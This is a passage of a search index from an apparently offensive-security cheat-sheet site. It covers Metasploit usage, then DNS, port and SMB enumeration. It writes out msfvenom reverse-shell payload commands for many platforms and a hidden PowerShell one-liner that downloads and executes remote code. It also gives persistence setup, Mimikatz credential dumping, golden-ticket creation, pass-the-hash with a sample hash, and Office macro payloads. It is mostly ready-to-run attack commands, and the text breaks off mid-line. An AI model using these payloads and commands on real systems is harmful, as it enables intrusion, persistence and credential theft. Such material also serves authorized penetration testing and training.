https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall\n</code></pre>"},{"location":"command-control/metasploit/#sessions","title":"Sessions","text":"<pre><code>CTRL+Z   -&gt; Session in Background\nsessions -&gt; List sessions\nsessions -i session_number -&gt; Interact with Session with id\nsessions -u session_number -&gt; Upgrade session to a meterpreter\nsessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false-&gt; Upgrade session to a meterpreter\nsessions -c cmd           -&gt; Execute a command on several sessions\nsessions -i 10-20 -c \"id\" -&gt; Execute a command on several sessions\n</code></pre>"},{"location":"command-control/metasploit/#background-handler","title":"Background handler","text":"<p>ExitOnSession : the handler will not exit if the meterpreter dies.</p> <pre><code>screen -dRR\nsudo msfconsole\nuse exploit/multi/handler\nset PAYLOAD generic/shell_reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4444\nset ExitOnSession false\ngenerate -o /tmp/meterpreter.exe -f exe\nto_handler\n[ctrl+a] + [d]\n</code></pre>"},{"location":"command-control/metasploit/#meterpreter-basic","title":"Meterpreter - Basic","text":""},{"location":"command-control/metasploit/#generate-a-meterpreter","title":"Generate a meterpreter","text":"<pre><code>$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f elf &gt; shell.elf\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f exe &gt; shell.exe\n$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f macho &gt; shell.macho\n$ msfvenom -p php/meterpreter_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f raw &gt; shell.php; cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f asp &gt; shell.asp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f raw &gt; shell.jsp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f war &gt; shell.war\n$ msfvenom -p cmd/unix/reverse_python LHOST=\"10.10.10.110\" LPORT=4242 -f raw &gt; shell.py\n$ msfvenom -p cmd/unix/reverse_bash LHOST=\"10.10.10.110\" LPORT=4242 -f raw &gt; shell.sh\n$ msfvenom -p cmd/unix/reverse_perl LHOST=\"10.10.10.110\" LPORT=4242 -f raw &gt; shell.pl\n</code></pre>"},{"location":"command-control/metasploit/#meterpreter-webdelivery","title":"Meterpreter Webdelivery","text":"<p>Set up a Powershell web delivery listening on port 8080.</p> <pre><code>use exploit/multi/script/web_delivery\nset TARGET 2\nset payload windows/x64/meterpreter/reverse_http\nset LHOST 10.0.0.1\nset LPORT 4444\nrun\n</code></pre> <pre><code>powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB');\n</code></pre>"},{"location":"command-control/metasploit/#get-system","title":"Get System","text":"<pre><code>meterpreter &gt; getsystem\n...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>"},{"location":"command-control/metasploit/#persistence-startup","title":"Persistence Startup","text":"<pre><code>OPTIONS:\n-A        Automatically start a matching exploit/multi/handler to connect to the agent\n-L &lt;opt&gt;  Location in target host to write payload to, if none %TEMP% will be used.\n-P &lt;opt&gt;  Payload to use, default is windows/meterpreter/reverse_tcp.\n-S        Automatically start the agent on boot as a service (with SYSTEM privileges)\n-T &lt;opt&gt;  Alternate executable template to use\n-U        Automatically start the agent when the User logs on\n-X        Automatically start the agent when the system boots\n-h        This help menu\n-i &lt;opt&gt;  The interval in seconds between each connection attempt\n-p &lt;opt&gt;  The port on which the system running Metasploit is listening\n-r &lt;opt&gt;  The IP of the system running Metasploit listening for the connect back\nmeterpreter &gt; run persistence -U -p 4242\n</code></pre>"},{"location":"command-control/metasploit/#network-monitoring","title":"Network Monitoring","text":"<pre><code># list interfaces\nrun packetrecorder -li\n# record interface n\u00b01\nrun packetrecorder -i 1\n</code></pre>"},{"location":"command-control/metasploit/#portforward","title":"Portforward","text":"<pre><code>portfwd add -l 7777 -r 172.17.0.2 -p 3006\n</code></pre>"},{"location":"command-control/metasploit/#upload-download","title":"Upload / Download","text":"<pre><code>upload /path/in/hdd/payload.exe exploit.exe\ndownload /path/in/victim\n</code></pre>"},{"location":"command-control/metasploit/#execute-from-memory","title":"Execute from Memory","text":"<pre><code>execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w\n</code></pre>"},{"location":"command-control/metasploit/#mimikatz","title":"Mimikatz","text":"<pre><code>load mimikatz\nmimikatz_command -f version\nmimikatz_command -f samdump::hashes\nmimikatz_command -f sekurlsa::wdigest\nmimikatz_command -f sekurlsa::searchPasswords\nmimikatz_command -f sekurlsa::logonPasswords full\n</code></pre> <pre><code>load kiwi\ncreds_all\ngolden_ticket_create -d &lt;domainname&gt; -k &lt;nthashof krbtgt&gt; -s &lt;SID without le RID&gt; -u &lt;user_for_the_ticket&gt; -t &lt;location_to_store_tck&gt;\n</code></pre>"},{"location":"command-control/metasploit/#pass-the-hash-psexec","title":"Pass the Hash - PSExec","text":"<pre><code>msf &gt; use exploit/windows/smb/psexec\nmsf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp\nmsf exploit(psexec) &gt; exploit\nSMBDomain             WORKGROUP                                                          no        The Windows domain to use for authentication\nSMBPass               598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf  no        The password for the specified username\nSMBUser               Lambda                                                             no        The username to authenticate as\n</code></pre>"},{"location":"command-control/metasploit/#use-socks-proxy","title":"Use SOCKS Proxy","text":"<pre><code>setg Proxies socks4:127.0.0.1:1080\n</code></pre>"},{"location":"command-control/metasploit/#scripting-metasploit","title":"Scripting Metasploit","text":"<p>Using a <code>.rc file</code>, write the commands to execute, then run <code>msfconsole -r ./file.rc</code>. Here is a simple example to script the deployment of a handler an create an Office doc with macro.</p> <pre><code>use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_https\nset LHOST 0.0.0.0\nset LPORT 4646\nset ExitOnSession false\nexploit -j -z\nuse exploit/multi/fileformat/office_word_macro \nset PAYLOAD windows/meterpreter/reverse_https\nset LHOST 10.10.14.22\nset LPORT 4646\nexploit\n</code></pre>"},{"location":"command-control/metasploit/#multiple-transports","title":"Multiple transports","text":"<pre><code>msfvenom -p windows/meterpreter_reverse_tcp lhost=&lt;host&gt; lport=&lt;port&gt; sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe\n</code></pre> <p>Then, in AddTransports.ps1</p> <pre><code>Add-TcpTransport -lhost &lt;host&gt; -lport &lt;port&gt; -RetryWait 10 -RetryTotal 30\nAdd-WebTransport -Url http(s)://&lt;host&gt;:&lt;port&gt;/&lt;luri&gt; -RetryWait 10 -RetryTotal 30\n</code></pre>"},{"location":"command-control/metasploit/#best-of-exploits","title":"Best of - Exploits","text":"<ul> <li>MS17-10 Eternal Blue - <code>exploit/windows/smb/ms17_010_eternalblue</code></li> <li>MS08_67 - <code>exploit/windows/smb/ms08_067_netapi</code></li> </ul>"},{"location":"command-control/metasploit/#references","title":"References","text":"<ul> <li>Multiple transports in a meterpreter payload - ionize</li> <li>Creating Metasploit Payloads - Peleus</li> </ul>"},{"location":"information-gathering/active-reconnaissance/","title":"Active reconnaissance","text":"<p>Active Information Gathering is the process of collecting information about a target with direct interaction such as banner grabbing, port scanning. These typically are detected by IPS/IDS systems.</p>"},{"location":"information-gathering/active-reconnaissance/#dns-enumeration","title":"DNS Enumeration","text":""},{"location":"information-gathering/active-reconnaissance/#quick-intro","title":"Quick Intro","text":"<ul> <li>DNS enumeration is the process of identifying the DNS servers and the corresponding DNS records. DNS stands for Domain Name System which is a database containing information about domain names and their corresponding IP addresses. The DNS system is responsible for translating human-readable hostnames into machine-readable IP addresses.</li> <li>A (address) records containing the IP address of the domain.</li> <li>MX records, which stands for Mail Exchange, contain the mail exchange servers.</li> <li>CNAME records used for aliasing domains. CNAME stands for Canonical Name and links any sub-domains with existing domain DNS records.</li> <li>NS records, which stands for Name Server, indicates the authoritative (or main) name server for the domain.</li> <li>SOA records, which stands for State of Authority, contain important information about the domain such as the primary name server, a timestamp showing when the domain was last updated and the party responsible for the domain.</li> <li>PTR or Pointer Records map an IPv4 address to the CNAME on the host. This record is also called a \u2018reverse record\u2019 because it connects a record with an IP address to a hostname instead of the other way around.</li> <li>TXT records contain text inserted by the administrator (such as notes about the way the network has been configured).</li> <li>The information retrieved during DNS enumeration will consist of details about names servers and IP addresses of potential targets (such as mail servers, sub-domains etc). Some tools used for DNS enumeration included with Kali Linux are: whois, nslookup, dig, host and automated tools like Fierce, DNSenum and DNSrecon. Let\u2019s briefly review these tools and see how we can use them for DNS enumeration.</li> </ul>"},{"location":"information-gathering/active-reconnaissance/#whois","title":"Whois","text":"<pre><code>whois &lt;domain&gt;\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#nmap","title":"Nmap","text":"<pre><code>nmap -sC -sV -p53 $ip/24\n\nnmap -p 80 --script dns-brute.nse domain.com\n# Find DNS (A) records by trying a list of common sub-domains from a wordlist.\n\nnmap $ip --script=dns-zone-transfer -p 53\n# Zone transfer script\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#host","title":"Host","text":""},{"location":"information-gathering/active-reconnaissance/#domain-scan","title":"Domain Scan","text":"<pre><code>$ host google.com\n\ngoogle.com has address 142.250.183.78\ngoogle.com has IPv6 address 2404:6800:4009:822::200e\ngoogle.com mail is handled by 20 alt1.aspmx.l.google.com.\ngoogle.com mail is handled by 10 aspmx.l.google.com.\ngoogle.com mail is handled by 50 alt4.aspmx.l.google.com.\ngoogle.com mail is handled by 40 alt3.aspmx.l.google.com.\ngoogle.com mail is handled by 30 alt2.aspmx.l.google.com.\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#find-particular-records","title":"Find Particular Records","text":"<pre><code>host -t mx google.com\n# Return mail servers \n\nhost -t ns google.com\n# Return name servers \n\nhost -t txt google.com\n# Return txt records\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#reverse-domain-lookup","title":"Reverse Domain Lookup","text":"<pre><code>$ host gnu.org        \n\ngnu.org has address 209.51.188.148\ngnu.org has IPv6 address 2001:470:142:3::a\ngnu.org mail is handled by 10 eggs.gnu.org.\n\n$ host 209.51.188.148\n\n148.188.51.209.in-addr.arpa is an alias for 148.0-24.188.51.209.in-addr.arpa.\n148.0-24.188.51.209.in-addr.arpa domain name pointer wildebeest.gnu.org.\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#dns-zone-transfer","title":"DNS Zone Transfer","text":"<p>DNS zone transfer, also known as DNS query type AXFR, is a process by which a DNS server passes a copy of part of its database to another DNS server. The portion of the database that is replicated is known as a zone.</p> <pre><code>host -l &lt;domain&gt; &lt;NameServer&gt;\n</code></pre> <pre><code>$ host -t ns zonetransfer.me               # first list out their name servers to check for zone transfer\n\nzonetransfer.me name server nsztm2.digi.ninja.\nzonetransfer.me name server nsztm1.digi.ninja.\n\n$ host -l zonetransfer.me nsztm1.digi.ninja\n\nUsing domain server:\nName: nsztm1.digi.ninja\nAddress: 81.4.108.41#53\nAliases: \n\nzonetransfer.me has address 5.196.105.14\nzonetransfer.me name server nsztm1.digi.ninja.\nzonetransfer.me name server nsztm2.digi.ninja.\n14.105.196.5.IN-ADDR.ARPA.zonetransfer.me domain name pointer www.zonetransfer.me.\nasfdbbox.zonetransfer.me has address 127.0.0.1\ncanberra-office.zonetransfer.me has address 202.14.81.230\ndc-office.zonetransfer.me has address 143.228.181.132\ndeadbeef.zonetransfer.me has IPv6 address dead:beaf::\nemail.zonetransfer.me has address 74.125.206.26\nhome.zonetransfer.me has address 127.0.0.1\ninternal.zonetransfer.me name server intns1.zonetransfer.me.\ninternal.zonetransfer.me name server intns2.zonetransfer.me.\nintns1.zonetransfer.me has address 81.4.108.41\nintns2.zonetransfer.me has address 167.88.42.94\noffice.zonetransfer.me has address 4.23.39.254\nipv6actnow.org.zonetransfer.me has IPv6 address 2001:67c:2e8:11::c100:1332\nowa.zonetransfer.me has address 207.46.197.32\nalltcpportsopen.firewall.test.zonetransfer.me has address 127.0.0.1\nvpn.zonetransfer.me has address 174.36.59.154\nwww.zonetransfer.me has address 5.196.105.14\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#zone-transfer-script","title":"Zone Transfer Script","text":"<pre><code>#!/bin/bash\n# Simple Zone Transfer Bash Script\n# $1 is the first argument given after the bash script\n# Check if argument was given, if not, print usage\nif [ -z \"$1\" ]; then\necho \"[*] Simple Zone transfer script\"\necho \"[*] Usage : $0 &lt;domain name&gt; \"\nexit 0\nfi\n# if argument was given, identify the DNS servers for the domain\nfor server in $(host -t ns $1 | cut -d \" \" -f4); do\n# For each of these servers, attempt a zone transfer\nhost -l $1 $server |grep \"has address\"\ndone\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#subdomain-brute-forcing-using-common-hostname","title":"Subdomain Brute Forcing Using Common Hostname","text":"<pre><code>for ip in $(cat list.txt); do host $ip.website.com; done\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#reverse-dns-lookup-brute-forcing","title":"Reverse DNS Lookup Brute Forcing","text":"<pre><code>for ip in $(seq 155 190);do host $ip;done | grep -v \"not found\"\n</code></pre> <p>The <code>ip</code> is based on subdomain brute forcing result</p>"},{"location":"information-gathering/active-reconnaissance/#nslookup","title":"Nslookup","text":"<p>nslookup is used to query Internet name servers interactively.</p> <pre><code>$ nslookup hsploit.com\n\nServer:     203.153.41.28\nAddress:    203.153.41.28#53\n\nNon-authoritative answer:\nName:   hsploit.com\nAddress: 104.21.38.165\nName:   hsploit.com\nAddress: 172.67.136.119\nName:   hsploit.com\nAddress: 2606:4700:3033::6815:26a5\nName:   hsploit.com\nAddress: 2606:4700:3035::ac43:8877\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#running-in-interactive-mode","title":"Running in Interactive Mode","text":"<pre><code>$ nslookup\n\n&gt; set type=ns\n&gt; hsploit.com\nServer:     203.153.41.28\nAddress:    203.153.41.28#53\n\nNon-authoritative answer:\nhsploit.com nameserver = dee.ns.cloudflare.com.\nhsploit.com nameserver = jim.ns.cloudflare.com.\n\nAuthoritative answers can be found from:\n&gt; \n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#gathering-information-from-specific-dns-server","title":"Gathering Information from Specific DNS Server","text":"<pre><code>$ nslookup                                \n\n&gt; server 10.10.10.13\nDefault server: 10.10.10.13\nAddress: 10.10.10.13#53\n\n&gt; 10.10.10.13\n13.10.10.10.in-addr.arpa    name = ns1.cronos.htb.\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#dig","title":"Dig","text":""},{"location":"information-gathering/active-reconnaissance/#domain-scan_1","title":"Domain Scan","text":"<pre><code>$ dig hsploit.com\n\n; &lt;&lt;&gt;&gt; DiG 9.16.18 &lt;&lt;&gt;&gt; hsploit.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 13539\n;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1472\n;; QUESTION SECTION:\n;hsploit.com.           IN  A\n\n;; ANSWER SECTION:\nhsploit.com.        1200    IN  A   104.21.38.165\nhsploit.com.        1200    IN  A   172.67.136.119\n\n;; Query time: 139 msec\n;; SERVER: 203.153.41.28#53(203.153.41.28)\n;; WHEN: Thu Jul 22 17:04:58 IST 2021\n;; MSG SIZE  rcvd: 72\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#query-for-particular-record","title":"Query for Particular Record","text":"<pre><code>dig hsploit.com -t mx\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#sorting-the-output","title":"Sorting the Output","text":"<pre><code>$ dig hsploit.com -t ns +short \n\ndee.ns.cloudflare.com.\njim.ns.cloudflare.com.\n</code></pre> <p>Note - if a particular type of information is not available, dig will NOT provide output.</p>"},{"location":"information-gathering/active-reconnaissance/#reverse-domain-lookup_1","title":"Reverse Domain Lookup","text":"<pre><code>$ dig -x 142.250.183.78 +short        \n\nbom12s12-in-f14.1e100.net.\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#zone-transfer","title":"Zone Transfer","text":"<pre><code>$ dig zonetransfer.me ns +short \n\nnsztm2.digi.ninja.\nnsztm1.digi.ninja.\n\n$ dig axfr zonetransfer.me @nsztm1.digi.ninja\n\n; &lt;&lt;&gt;&gt; DiG 9.16.18 &lt;&lt;&gt;&gt; axfr zonetransfer.me @nsztm1.digi.ninja\n;; global options: +cmd\nzonetransfer.me.    7200    IN  SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 1209600 3600\nzonetransfer.me.    300 IN  HINFO   \"Casio fx-700G\" \"Windows XP\"\nzonetransfer.me.    301 IN  TXT \"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA\"\nzonetransfer.me.    7200    IN  MX  0 ASPMX.L.GOOGLE.COM.\nzonetransfer.me.    7200    IN  MX  10 ALT1.ASPMX.L.GOOGLE.COM.\nzonetransfer.me.    7200    IN  MX  10 ALT2.ASPMX.L.GOOGLE.COM.\nzonetransfer.me.    7200    IN  MX  20 ASPMX2.GOOGLEMAIL.COM.\nzonetransfer.me.    7200    IN  MX  20 ASPMX3.GOOGLEMAIL.COM.\nzonetransfer.me.    7200    IN  MX  20 ASPMX4.GOOGLEMAIL.COM.\nzonetransfer.me.    7200    IN  MX  20 ASPMX5.GOOGLEMAIL.COM.\nzonetransfer.me.    7200    IN  A   5.196.105.14\nzonetransfer.me.    7200    IN  NS  nsztm1.digi.ninja.\nzonetransfer.me.    7200    IN  NS  nsztm2.digi.ninja.\n_acme-challenge.zonetransfer.me. 301 IN TXT \"6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI\"\n_sip._tcp.zonetransfer.me. 14000 IN SRV 0 0 5060 www.zonetransfer.me.\n14.105.196.5.IN-ADDR.ARPA.zonetransfer.me. 7200 IN PTR www.zonetransfer.me.\nasfdbauthdns.zonetransfer.me. 7900 IN   AFSDB   1 asfdbbox.zonetransfer.me.\nasfdbbox.zonetransfer.me. 7200  IN  A   127.0.0.1\nasfdbvolume.zonetransfer.me. 7800 IN    AFSDB   1 asfdbbox.zonetransfer.me.\ncanberra-office.zonetransfer.me. 7200 IN A  202.14.81.230\ncmdexec.zonetransfer.me. 300    IN  TXT \"; ls\"\ncontact.zonetransfer.me. 2592000 IN TXT \"Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes\"\ndc-office.zonetransfer.me. 7200 IN  A   143.228.181.132\ndeadbeef.zonetransfer.me. 7201  IN  AAAA    dead:beaf::\ndr.zonetransfer.me. 300 IN  LOC 53 20 56.558 N 1 38 33.526 W 0.00m 1m 10000m 10m\nDZC.zonetransfer.me.    7200    IN  TXT \"AbCdEfG\"\nemail.zonetransfer.me.  2222    IN  NAPTR   1 1 \"P\" \"E2U+email\" \"\" email.zonetransfer.me.zonetransfer.me.\nemail.zonetransfer.me.  7200    IN  A   74.125.206.26\nHello.zonetransfer.me.  7200    IN  TXT \"Hi to Josh and all his class\"\nhome.zonetransfer.me.   7200    IN  A   127.0.0.1\nInfo.zonetransfer.me.   7200    IN  TXT \"ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.\"\ninternal.zonetransfer.me. 300   IN  NS  intns1.zonetransfer.me.\ninternal.zonetransfer.me. 300   IN  NS  intns2.zonetransfer.me.\nintns1.zonetransfer.me. 300 IN  A   81.4.108.41\nintns2.zonetransfer.me. 300 IN  A   167.88.42.94\noffice.zonetransfer.me. 7200    IN  A   4.23.39.254\nipv6actnow.org.zonetransfer.me. 7200 IN AAAA    2001:67c:2e8:11::c100:1332\nowa.zonetransfer.me.    7200    IN  A   207.46.197.32\nrobinwood.zonetransfer.me. 302  IN  TXT \"Robin Wood\"\nrp.zonetransfer.me. 321 IN  RP  robin.zonetransfer.me. robinwood.zonetransfer.me.\nsip.zonetransfer.me.    3333    IN  NAPTR   2 3 \"P\" \"E2U+sip\" \"!^.*$!sip:customer-service@zonetransfer.me!\" .\nsqli.zonetransfer.me.   300 IN  TXT \"' or 1=1 --\"\nsshock.zonetransfer.me. 7200    IN  TXT \"() { :]}; echo ShellShocked\"\nstaging.zonetransfer.me. 7200   IN  CNAME   www.sydneyoperahouse.com.\nalltcpportsopen.firewall.test.zonetransfer.me. 301 IN A 127.0.0.1\ntesting.zonetransfer.me. 301    IN  CNAME   www.zonetransfer.me.\nvpn.zonetransfer.me.    4000    IN  A   174.36.59.154\nwww.zonetransfer.me.    7200    IN  A   5.196.105.14\nxss.zonetransfer.me.    300 IN  TXT \"'&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;\"\nzonetransfer.me.    7200    IN  SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 1209600 3600\n;; Query time: 133 msec\n;; SERVER: 81.4.108.41#53(81.4.108.41)\n;; WHEN: Thu Jul 22 17:28:02 IST 2021\n;; XFR size: 50 records (messages 1, bytes 1994)\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#automated-scanners","title":"Automated Scanners","text":""},{"location":"information-gathering/active-reconnaissance/#dnsenum","title":"dnsenum","text":"<pre><code>dnsenum $ip\n\ndnsenum google.com -f /usr/share/dnsenum/dns.txt\n# Brute forcing subdomains\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#dnsrecon","title":"dnsrecon","text":"<pre><code>dnsrecon -d $ip\n\ndnsrecon -d $ip -t axfr\n# Perform zone transfer\n\ndnsrecon -d $ip -D /usr/share/dnsrecon/subdomains-top1mil-20000.txt -t brt\n# Perform host and subdomain brute force\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#subdomain-enumeration","title":"Subdomain Enumeration","text":""},{"location":"information-gathering/active-reconnaissance/#ffuf","title":"ffuf","text":"<pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.horizontall.htb\" -u http://horizontall.htb\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#sublist3r","title":"sublist3r","text":"<pre><code>sublist3r -d &lt;domain&gt;\n# To scan with public data\n\nsublist3r -d &lt;domain&gt; -b -t 100\n# To bruteforce the subdomains\n# this will use following wordlist:\n    /usr/share/sublist3r/subbrute/names.txt\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#port-scanning-with-nmap","title":"Port Scanning with Nmap","text":""},{"location":"information-gathering/active-reconnaissance/#scan-for-live-hosts","title":"Scan for live hosts","text":"<pre><code>$ nmap -sn $ip/24\n\n$ nmap -vvv -sn $ip/24\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#scan-specific-ip-range","title":"Scan Specific IP range","text":"<pre><code>$ nmap -sP 10.0.0.0-100\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#autorecon","title":"AutoRecon","text":"<pre><code>autorecon $ip\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#initial-tcp-scan","title":"Initial TCP Scan","text":"<pre><code>nmap -sC -sV -O -oA initial $ip\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#full-tcp-scan","title":"Full TCP Scan","text":"<pre><code>nmap -sC -sV -O -p- -oA nmap/full $ip\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#full-udp-scan","title":"Full UDP Scan","text":"<pre><code>nmap -sU -O -p- -oA nmap/udp $ip\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#port-knocking","title":"Port Knocking","text":"<pre><code>for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x $ip; done\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#deep-scan","title":"Deep Scan","text":"<pre><code>$ nmap -v -p- -sT $ip\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#max-scan-delay","title":"Max Scan Delay","text":"<pre><code>nmap -sC -sV $ip -oN initial -v --max-scan-delay=10\n</code></pre> <p>The <code>\u2013max-scan-delay</code> argument is used to specify the maximum amount of time Nmap should wait between probes.</p>"},{"location":"information-gathering/active-reconnaissance/#maximum-retries","title":"Maximum Retries","text":"<pre><code>nmap -p21-25$ip --max-retries 0\n</code></pre> <ul> <li>The <code>\u2013max-retries</code> argument specifies the number of times a packet is to be resent on a port to check if it is open or closed</li> <li>If <code>\u2013max-retries</code> is set to 0, the packets will be sent only once on a port and no retries will be done</li> </ul>"},{"location":"information-gathering/active-reconnaissance/#scan-for-specific-port","title":"Scan for Specific Port","text":"<pre><code>nmap -p T:80,443,8080 $ip/24\n</code></pre> <ul> <li><code>-T</code> argument specifies TCP ports</li> <li><code>-U</code> argument specifies UDP ports</li> </ul>"},{"location":"information-gathering/active-reconnaissance/#scan-target-from-text-file","title":"Scan Target from Text File","text":"<p>Create a text file that contains a list of our targets machines:</p> <pre><code>$ip1\n$ip2\n$ip3\n</code></pre> <p>Run nmap with <code>-iL</code> argument</p> <pre><code>nmap -iL list-of-ips.txt\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#banner-grabbing","title":"Banner Grabbing","text":"<pre><code>nmap -sV -sT $ip\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#os-fingerprinting","title":"OS Fingerprinting","text":"<pre><code>nmap -O $ip\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#stealth-scan","title":"Stealth Scan","text":"<pre><code>nmap -sS $ip\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#autorecon_1","title":"AutoRecon","text":"<p>https://github.com/Tib3rius/AutoRecon</p>"},{"location":"information-gathering/active-reconnaissance/#smb-enumeration","title":"SMB Enumeration","text":""},{"location":"information-gathering/active-reconnaissance/#quick-intro_1","title":"Quick Intro","text":"<ul> <li>SMB stands for Server Message Block</li> <li>SMB allows you to share resources to other devices over the network</li> <li>There are 3 versions of SMB<ul> <li>SMBv1 version susceptible to known attacks (Eternal blue , wanna cry). Disabled by default in newer Windows versions.</li> <li>SMBv2 reduced \"chattiness\" of SMBv1. Guest access disabled by default.</li> <li>SMBv3 guest access disabled, uses encryption; most secure.</li> </ul> </li> <li>TCP port 139 is SMB over NetBios</li> <li>TCP port 445 is SMB over TCP/IP. This is the newer version of SMB.</li> </ul> <p>List of SMB versions and corresponding Windows versions:</p> <ol> <li>SMBv1 \u2013 Windows 2000, XP and Windows 2003</li> <li>SMBv2 - Windows Vista SP1 and Windows 2008</li> <li>SMBv2.1 - Windows 7 and Windows 2008 R2</li> <li>SMBv3 - Windows 8 and Windows 2012</li> </ol>"},{"location":"information-gathering/active-reconnaissance/#nmap-scanning","title":"Nmap Scanning","text":"<pre><code>nmap -n -v -Pn -p139,445 -sV $ip\n\n# Get version information\n</code></pre> <pre><code>nmap $ip --script=smb-enum*\n\nnmap $ip --script=smb-vuln*\n\nnmap $ip --script=smb-os*\n\n# Scan with NSE Scripts\n</code></pre> <pre><code>nmap $ip --script smb-os-discovery.nse\n# SMB OS discovery\n\nnmap -sU --script nbstat.nse -p 137 $ip\n# scan exposed NetBIOS servers\n\nnmap -sV --script=nfs-showmount $ip\n# show mountable NFS shares\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#ntbscan","title":"ntbscan","text":"<pre><code>nbtscan -r $ip/24\n# NetBIOS Information Scanning\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#list-available-shares","title":"List Available Shares","text":""},{"location":"information-gathering/active-reconnaissance/#smbclient","title":"smbclient","text":"<pre><code>smbclient -L \\\\\\\\$ip\\\\\n# Will list all shares\n\nsmbclient -L \\\\$ip --option='client min protocol=NT1'\n# if getting error \"protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED\"\n\nsmbclient //HOST/PATH -c 'recurse;ls'\n# list all files recursly\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#smbmap","title":"smbmap","text":"<pre><code>smbmap -H $ip\n# ist all shares with available permissions\n\nsmbmap -H $ip -R $sharename\n# recursively list directories and files\n\nsmbmap -u '' -p '' -H $ip \nsmbmap -u guest -p '' -H $ip\nsmbmap -u jsmith -p password1 -d workgroup -H $ip\n# With credentials\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#nmap_1","title":"Nmap","text":"<pre><code>nmap --script smb-enum-shares -p 139,445 $ip\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#connecting-to-shares","title":"Connecting to Shares","text":"<pre><code>smbclient \\\\\\\\$ip\\\\C$\nor\nsmbclient \\\\\\\\$ip\\\\C$ --option='client min protocol=NT1'\n\nsmbclient \\\\\\\\$ip\\\\admin$ -U t-skid\n# Connect with valid username and password \n# Specify username with -U\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#downloading-multi-files","title":"Downloading Multi Files","text":"<pre><code>smb: \\&gt; RECURSE ON\nsmb: \\&gt; PROMPT OFF\nsmb: \\&gt; mget *\n# With smbclient\n\nsmbmap -R $sharename -H $ip -A $fileyouwanttodownload -q\n# 